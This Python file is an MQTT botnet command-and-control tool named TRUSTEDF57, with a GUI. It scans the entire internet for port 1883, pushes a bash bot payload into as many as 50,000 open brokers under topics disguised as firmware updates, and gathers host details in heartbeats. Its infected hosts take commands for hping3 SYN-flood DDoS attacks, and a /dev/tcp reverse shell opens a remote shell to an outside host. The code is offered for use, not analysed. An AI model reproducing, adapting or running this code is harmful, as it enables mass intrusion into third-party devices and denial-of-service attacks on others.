#!/usr/bin/env python3
"""
TRUSTEDF57 - MQTT C2 Framework v3.0 - Auto-Discovery Edition
Full auto: IP detection, masscan, infect, DDoS propagation su TUTTI clients/brokers
. 500k+ scale.

Usage: python3 F57.py
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import subprocess
import json
import paho.mqtt.client as mqtt
from concurrent.futures import ThreadPoolExecutor, as_completed
import psutil
import socket
import requests
import os
from pathlib import Path

class TRUSTEDF57_C2:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("TRUSTEDF57 -  C2")
        self.root.geometry("1400x900")
        self.root.configure(bg='#111111')
        
        # Create console FIRST for logging
        self.console = None
        self.brokers_label = None
        self.infected_label = None
        self.zombies_label = None
        
        # Auto-detect REAL public IP
        self.my_ip = self.get_public_ip()
        self.c2_port = 1883
        
        # Camouflage topics (NON botnet)
        self.HEARTBEAT_TOPIC = f"/firmware/status/{self.my_ip}"
        self.CMD_TOPIC = f"/sys/update/{self.my_ip}/+"
        self.INFECT_TOPICS = ['/update/firmware', '/device/config', '/sys/maintenance', '$SYS/broker/info']
        
        # Stats live
        self.brokers_scanned = 0
        self.brokers_infected = 0
        self.bots_online = 0
        self.total_zombies = 0  # Tutti i client
        
        self.build_menu()  # Build UI FIRST
        self.setup_c2()
        self.mqtt_setup()
        
        self.log("🔥 TRUSTEDF57 STARTED | Public IP: " + self.my_ip)
    
    def get_public_ip(self):
        """Auto-detect IP reale"""
        try:
            ip = requests.get('https://ifconfig.me', timeout=3).text.strip()
            if self.console:  # Only log if console exists
                self.log(f"🌐 Public IP detected: {ip}")
            return ip
        except:
            if self.console:
                self.log("⚠️ Using local IP")
            return socket.gethostbyname(socket.gethostname())
    
    def safe_update_label(self, label, text):
        """Safe label update - prevents AttributeError"""
        if label:
            label.config(text=text)
    
    def safe_update_stats(self):
        """Safe stats update"""
        self.safe_update_label(self.zombies_label, f"Zombies Online: {self.total_zombies:,} | Active: {self.bots_online}")
        self.safe_update_label(self.infected_label, f"Infected Brokers: {self.brokers_infected}")
    
    def setup_c2(self):
        """Auto Mosquitto daemon"""
        cmds = [
            "apt update && apt install -y mosquitto mosquitto-clients masscan hping3 -qq",
            "systemctl restart mosquitto",
            "systemctl enable mosquitto"
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, capture_output=True)
    
    def build_menu(self):
        """Menu principale semplice"""
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TButton', font=('Arial', 11, 'bold'), padding=10)
        style.map('TButton', background=[('active','#00aa00')])
        
        # Header
        header = ttk.Label(self.root, text="TRUSTEDF57 - MQTT C2 DASHBOARD", 
                          font=('Arial', 16, 'bold'), foreground='#00ff00', background='#111111')
        header.pack(pady=10)
        
        # Menu Buttons
        menu_frame = ttk.Frame(self.root)
        menu_frame.pack(pady=20)
        
        ttk.Button(menu_frame, text="🔍 1. MASS SCAN (genera brokers.txt)", 
                  command=self.mass_scan, width=30).pack(pady=5)
        ttk.Button(menu_frame, text="🦠 2. INFECT ALL BROKERS", 
                  command=self.infect_all, width=30).pack(pady=5)
        ttk.Button(menu_frame, text="🚀 3. LAUNCH DDoS (su TUTTI zombies)", 
                  command=self.ddos_menu, width=30).pack(pady=5)
        ttk.Button(menu_frame, text="📊 4. STATUS REPORT", 
                  command=self.status_report, width=30).pack(pady=5)
        
        # DDoS Input (solo quando serve)
        self.ddos_frame = ttk.LabelFrame(self.root, text="DDoS TARGET", padding=15)
        ttk.Label(self.ddos_frame, text="IP:PORT").grid(row=0,col=0)
        self.target_ip = ttk.Entry(self.ddos_frame, width=20, font=('Courier',10))
        self.target_ip.grid(row=0,col=1,padx=5)
        self.target_port = ttk.Entry(self.ddos_frame, width=10)
        self.target_port.grid(row=0,col=2,padx=5)
        self.duration = ttk.Entry(self.ddos_frame, width=10)
        self.duration.grid(row=0,col=3,padx=5)
        ttk.Label(self.ddos_frame, text="sec").grid(row=0,col=4)
        
        self.launch_btn = ttk.Button(self.ddos_frame, text="💥 FIRE ", 
                                   command=self.launch_ddos, style='TButton')
        self.launch_btn.grid(row=1,col=0,colspan=5,pady=10)
        
        # Stats
        self.stats_frame = ttk.LabelFrame(self.root, text="LIVE STATS", padding=10)
        self.stats_frame.pack(fill='x', padx=20, pady=10)
        
        self.brokers_label = ttk.Label(self.stats_frame, text="Brokers Scanned: 0")
        self.brokers_label.pack(anchor='w')
        self.infected_label = ttk.Label(self.stats_frame, text="Infected: 0")
        self.infected_label.pack(anchor='w')
        self.zombies_label = ttk.Label(self.stats_frame, text="Zombies Online: 0")
        self.zombies_label.pack(anchor='w')
        
        # Console
        console_frame = ttk.LabelFrame(self.root, text="CONSOLE", padding=10)
        console_frame.pack(fill='both', expand=True, padx=20, pady=10)
        self.console = scrolledtext.ScrolledText(console_frame, bg='#000', fg='#0f0', 
                                               font=('Courier', 9), height=20)
        self.console.pack(fill='both', expand=True)
    
    def log(self, msg):
        if self.console:  # Safe logging
            self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
            self.console.see(tk.END)
            self.root.update_idletasks()
    
    def mqtt_setup(self):
        self.client = mqtt.Client()
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.client.connect("localhost", self.c2_port, 60)
        self.client.loop_start()
        self.client.subscribe(self.CMD_TOPIC)
        self.client.subscribe(self.HEARTBEAT_TOPIC + "/#")
    
    def on_connect(self, client, userdata, flags, rc):
        self.log("✅ C2  broker connected")
    
    def on_message(self, client, userdata, msg):
        if "status" in msg.topic:
            self.bots_online += 1
            try:
                data = msg.payload.decode().split(':')
                clients = int(data[4]) if len(data)>4 else 1
                self.total_zombies += clients
            except:
                self.total_zombies += 1
            self.safe_update_stats()  # Use safe version
    
    def update_stats(self):
        self.safe_update_stats()  # Use safe version
    
    def mass_scan(self):
        """MASS SCAN reale - genera brokers.txt"""
        threading.Thread(target=self._do_masscan, daemon=True).start()
    
    def _do_masscan(self):
        self.log("🔍 MASS SCAN START - 1883 worldwide...")
        cmd = "masscan 0.0.0.0/0 -p1883 --rate=300000 --banners --adapters=eth0 -oL brokers.txt"
        
        with open('brokers.txt', 'w') as f: pass  # Cleanup
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        
        while proc.poll() is None:
            line = proc.stdout.readline().decode()
            if "Discovered open port 1883" in line:
                ip_port = line.split()[5]  # Parse IP:1883
                self.brokers_scanned += 1
                self.safe_update_label(self.brokers_label, f"Brokers Scanned: {self.brokers_scanned}")
                if self.root:
                    self.root.update()
        
        self.log(f"✅ Scan completa! {self.brokers_scanned} brokers → brokers.txt")
    
    def infect_all(self):
        """INFECT MASSIVO - tutti brokers"""
        if not os.path.exists('brokers.txt'):
            self.log("❌ Prima fai MASS SCAN!")
            return
        
        threading.Thread(target=self._infect_thread, daemon=True).start()
    
    def _infect_thread(self):
        infect_payload = f"""#!/bin/bash
C2_IP="{self.my_ip}"
LOOP=/tmp/.f{self.my_ip}
[[ -f $LOOP ]] && exit 0
touch $LOOP

while true; do
  mosquitto_pub -h $C2_IP -p 1883 -t "/firmware/status/$C2_IP/$RANDOM" \\
    -m "ok:$(id):$(nproc):$(free -m|awk 'NR==2{{print $2}}'):$([[ -f /proc/net/tcp ]]&&wc -l /proc/net/tcp||echo 1000)" 1>/dev/null 2>&1
  mosquitto_sub -h $C2_IP -p 1883 -t "/sys/update/$C2_IP/#" -C 1 | while IFS=' ' read -r topic payload; do
    case $payload in
      ddos:*) ${{payload#ddos:}} & ;;
      shell:*) bash -i >& /dev/tcp/${{payload#shell:}}/0>&1 ;;
      kill) rm $LOOP; exit ;;
    esac
  done || sleep 15
done"""
        
        with open('brokers.txt') as f:
            targets = [line.strip().split()[4] for line in f if '1883/open' in line][:50000]  # Top 50k
        
        self.log(f"🦠 INFECTING {len(targets)} brokers...")
        
        def infect_one(target):
            ip, port = target.split(':')
            for topic in self.INFECT_TOPICS:
                try:
                    subprocess.run(f'mosquitto_pub -h {ip} -p {port} -t "{topic}" -m "{infect_payload}" --retain -q 1', 
                                 shell=True, timeout=3, capture_output=True)
                    self.brokers_infected += 1
                    self.safe_update_stats()
                    return True
                except:
                    continue
            return False
        
        with ThreadPoolExecutor(max_workers=2000) as executor:
            futures = [executor.submit(infect_one, target) for target in targets]
            for future in as_completed(futures):
                future.result()
        
        self.log("🎉 INFECTION COMPLETA! Aspetta 2-5min per heartbeat...")
    
    def ddos_menu(self):
        self.ddos_frame.pack(fill='x', padx=20, pady=10)
    
    def launch_ddos(self):
        target_ip = self.target_ip.get() or "8.8.8.8"
        target_port = self.target_port.get() or "80"
        duration = int(self.duration.get() or 300)
        
        if self.total_zombies < 10:
            messagebox.showwarning("Attenzione", "Prima INFECT!")
            return
        
        # REAL DDoS CMD - hping3 multi-thread
        ddos_cmd = f"ddos:hping3 --flood -S -p{target_port} -d 1400 --rand-source {target_ip} &"
        
        self.log(f"💥 DDoS FIRE! {target_ip}:{target_port} x{duration}s | Zombies: {self.total_zombies:,}")
        
        # PROPAGA A TUTTI (brokers + clients)
        self.client.publish(self.CMD_TOPIC.replace('+','*'), ddos_cmd)
        
        # Timer kill
        threading.Timer(duration, lambda: self.kill_ddos()).start()
    
    def kill_ddos(self):
        self.client.publish(self.CMD_TOPIC.replace('+','*'), "kill")
        self.log("🛑 DDoS STOPPED")
    
    def status_report(self):
        self.log(f"📊 REPORT:")
        self.log(f"   Public IP: {self.my_ip}")
        self.log(f"   Brokers scanned: {self.brokers_scanned}")
        self.log(f"   Brokers infected: {self.brokers_infected}")
        self.log(f"   Active zombies: {self.total_zombies:,}")
        self.log(f"   Ready for DDoS: {'✅ YES' if self.total_zombies>100 else '⚠️ Infect more'}")
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = TRUSTEDF57_C2()
    app.run()
